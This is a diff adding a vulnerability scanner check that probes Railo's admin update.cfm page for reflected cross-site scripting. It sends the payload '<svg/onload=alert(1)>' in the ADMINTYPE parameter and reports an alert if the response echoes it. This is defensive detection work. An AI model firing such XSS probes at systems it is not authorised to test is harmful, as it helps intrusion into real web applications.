@@ -1,0 +1,41 @@
+#include helpers.inc;
+#include string_helpers.inc;
+// **************************************************************************************							 
+function alert(job, affects, pattern)
+{	
+	var ri = new TReportItem();
+	ri.LoadFromFile("Railo_Admin_XSS.xml");
+	ri.affects = affects;
+	ri.alertPath = "Scripts/Railo_Admin_XSS";	
+	
+	ri.setHttpInfo(job);
+	
+	if (pattern)
+		ri.Details =  ri.Details + "Pattern found: [dark]" + pattern + "[/dark]";
+	
+	AddReportItem(ri);	
+}
+function testAdminXSS() {		
+	var http = new THTTPJob();
+	http.url = scanURL;
+	http.port = 8888;
+	http.verb = 'GET';
+	http.uri = "/railo-context/admin/update.cfm?ADMINTYPE=admin<svg/onload=alert(1)>";
+	http.timeout = 10000;
+	http.retries = 0;	
+	http.addCookies = false;
+	http.execute();	
+	var patternStr = "key [passwordadmin<svg/onload=alert(1)>]";
+	if (!http.wasError && http.responseStatus == 200)
+	{
+		var ct = http.response.headerValue("content-type");
+		
+		if (ct && ct.startsWith("text/html") && http.response.body.indexOf(patternStr) != -1)	
+			{
+				alert(http, "/railo-context/admin/update.cfm", patternStr);
+			}
+	}
+}
+/***********************************************************************************/
+/* main entry point */
+testAdminXSS();
